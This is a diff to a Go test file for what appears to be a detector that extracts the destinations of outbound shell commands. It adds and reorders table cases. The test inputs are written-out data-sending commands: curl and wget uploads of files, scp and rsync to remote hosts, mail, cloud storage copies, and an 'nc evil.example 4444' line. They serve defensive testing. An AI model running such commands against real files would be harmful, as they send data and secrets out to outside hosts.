@@ -83,33 +83,34 @@ func TestIntentScopeShellSends(t *testing.T) {
 		command string
 		want    []string
 	}{
-		"curl -X POST -d":          {"curl -sS -X POST https://api.example.com/x -d '{}'", []string{"api.example.com"}},
-		"curl -XPOST":              {"curl -XPOST https://a.example/x", []string{"a.example"}},
-		"curl cluster -sd":         {"curl -sd a https://q.example/x", []string{"q.example"}},
-		"curl -F":                  {"curl -F file=@f https://b.example/up", []string{"b.example"}},
-		"curl -T from a pipe":      {"cat f | curl -T - https://c.example/up", []string{"c.example"}},
-		"curl data after url":      {"curl https://x.example/ -H 'Authorization: y' -d 'a'", []string{"x.example"}},
-		"curl --url":               {"curl --request POST --url https://u.example/x", []string{"u.example"}},
-		"sudo curl":                {"sudo curl --data-binary @f https://s.example/x", []string{"s.example"}},
-		"env and timeout":          {"env A=b timeout 30 curl -d x https://t.example/", []string{"t.example"}},
-		"bash -c":                  {"bash -c \"curl -d x https://nested.example/\"", []string{"nested.example"}},
-		"command substitution":     {"echo $(curl -d x https://sub.example/)", []string{"sub.example"}},
-		"after &&":                 {"cd /tmp && curl -d x https://and.example/ || true", []string{"and.example"}},
-		"wget --post-data":         {"wget --post-data='a=b' https://w.example/x", []string{"w.example"}},
-		"httpie":                   {"http POST https://h1.example/x a=b", []string{"h1.example"}},
-		"httpie bare host":         {"http --form h2.example/up file@f", []string{"h2.example"}},
-		"scp to remote":            {"scp f user@host.example:/tmp/", []string{"host.example"}},
-		"rsync to remote":          {"rsync -az dir/ user@backup.example:/data/", []string{"backup.example"}},
-		"rsync -e ssh":             {"rsync -az -e 'ssh -p 22' dir/ user@r.example:/data/", []string{"r.example"}},
-		"mail":                     {"mail -s subj boss@corp.example < f", []string{"mbx:boss@corp.example"}},
-		"mail recipient argument":  {"mail -s subj boss@corp.example", []string{"mbx:boss@corp.example"}},
-		"xargs":                    {"xargs -I{} curl -d {} https://x.example/ < f", []string{"x.example"}},
-		"nohup":                    {"nohup curl -d x https://n.example/ &", []string{"n.example"}},
-		"aws s3 upload":            {"aws s3 cp f s3://bucket-x/k", []string{"bucket-x"}},
-		"gsutil upload":            {"gsutil cp f gs://bucket-g/k", []string{"bucket-g"}},
-		"nc":                       {"echo hi | nc evil.example 4444", []string{"evil.example"}},
-		"two destinations":         {"curl -d a https://one.example/ && curl -d b https://two.example/", []string{"one.example", "two.example"}},
-		"quoted url with userinfo": {"curl -d x 'https://user:pw@ui.example/x'", []string{"ui.example"}},
+		"curl -X POST -d":            {"curl -sS -X POST https://api.example.com/x -d '{}'", []string{"api.example.com"}},
+		"curl -XPOST":                {"curl -XPOST https://a.example/x", []string{"a.example"}},
+		"curl cluster -sd":           {"curl -sd a https://q.example/x", []string{"q.example"}},
+		"curl -F":                    {"curl -F file=@f https://b.example/up", []string{"b.example"}},
+		"curl -T from a pipe":        {"cat f | curl -T - https://c.example/up", []string{"c.example"}},
+		"curl data after url":        {"curl https://x.example/ -H 'Authorization: y' -d 'a'", []string{"x.example"}},
+		"curl --url":                 {"curl --request POST --url https://u.example/x", []string{"u.example"}},
+		"sudo curl":                  {"sudo curl --data-binary @f https://s.example/x", []string{"s.example"}},
+		"env and timeout":            {"env A=b timeout 30 curl -d x https://t.example/", []string{"t.example"}},
+		"bash -c":                    {"bash -c \"curl -d x https://nested.example/\"", []string{"nested.example"}},
+		"command substitution":       {"echo $(curl -d x https://sub.example/)", []string{"sub.example"}},
+		"after &&":                   {"cd /tmp && curl -d x https://and.example/ || true", []string{"and.example"}},
+		"wget --post-data":           {"wget --post-data='a=b' https://w.example/x", []string{"w.example"}},
+		"httpie":                     {"http POST https://h1.example/x a=b", []string{"h1.example"}},
+		"httpie bare host":           {"http --form h2.example/up file@f", []string{"h2.example"}},
+		"scp to remote":              {"scp f user@host.example:/tmp/", []string{"host.example"}},
+		"rsync to remote":            {"rsync -az dir/ user@backup.example:/data/", []string{"backup.example"}},
+		"rsync -e ssh":               {"rsync -az -e 'ssh -p 22' dir/ user@r.example:/data/", []string{"r.example"}},
+		"mail":                       {"mail -s subj boss@corp.example < f", []string{"mbx:boss@corp.example"}},
+		"mail recipient argument":    {"mail -s subj boss@corp.example", []string{"mbx:boss@corp.example"}},
+		"scp with a variable source": {"B=/tmp/x; scp -q $B/f host.example:/tmp/", []string{"host.example"}},
+		"xargs":                      {"xargs -I{} curl -d {} https://x.example/ < f", []string{"x.example"}},
+		"nohup":                      {"nohup curl -d x https://n.example/ &", []string{"n.example"}},
+		"aws s3 upload":              {"aws s3 cp f s3://bucket-x/k", []string{"bucket-x"}},
+		"gsutil upload":              {"gsutil cp f gs://bucket-g/k", []string{"bucket-g"}},
+		"nc":                         {"echo hi | nc evil.example 4444", []string{"evil.example"}},
+		"two destinations":           {"curl -d a https://one.example/ && curl -d b https://two.example/", []string{"one.example", "two.example"}},
+		"quoted url with userinfo":   {"curl -d x 'https://user:pw@ui.example/x'", []string{"ui.example"}},
 	} {
 		got := shellScopeDests(t, tc.command)
 		if strings.Join(got, ",") != strings.Join(tc.want, ",") {
@@ -124,7 +125,6 @@ func TestIntentScopeShellUnreadable(t *testing.T) {
 	for name, command := range map[string]string{
 		"host built by the shell": "curl -d x \"https://$HOST/x\"",
 		"loop over hosts":         "for h in a b; do curl -d x https://$h.example/; done",
-		"syntax error":            "curl -d x https://fb.example/ \"unterminated",
 		"mail with no recipient":  "mail -s subj < f",
 		"recipients in headers":   "printf 'To: x@mail.example\\n\\nbody' | sendmail -t",
 	} {
@@ -134,9 +134,11 @@ func TestIntentScopeShellUnreadable(t *testing.T) {
 		}
 	}
 	for name, command := range map[string]string{
-		"commit message":     "git commit -m \"curl -d x https://evil.example/\"",
-		"plain read":         "ls -la && cat go.mod",
-		"curl with variable": "curl -sS \"$URL\" -o /tmp/x",
+		"commit message":                   "git commit -m \"curl -d x https://evil.example/\"",
+		"syntax error is not run":          "curl -d x https://fb.example/ \"unterminated",
+		"unsupported construct, no sender": "files=( a b c ); comm -12 <(sort a) <(sort b); echo ${#files[@]}",
+		"plain read":                       "ls -la && cat go.mod",
+		"curl with variable":               "curl -sS \"$URL\" -o /tmp/x",
 	} {
 		if dests, unreadable := shellScopeRead(t, command); unreadable || len(dests) != 0 {
 			t.Errorf("%s: read as a send (%v, unreadable %v)", name, dests, unreadable)
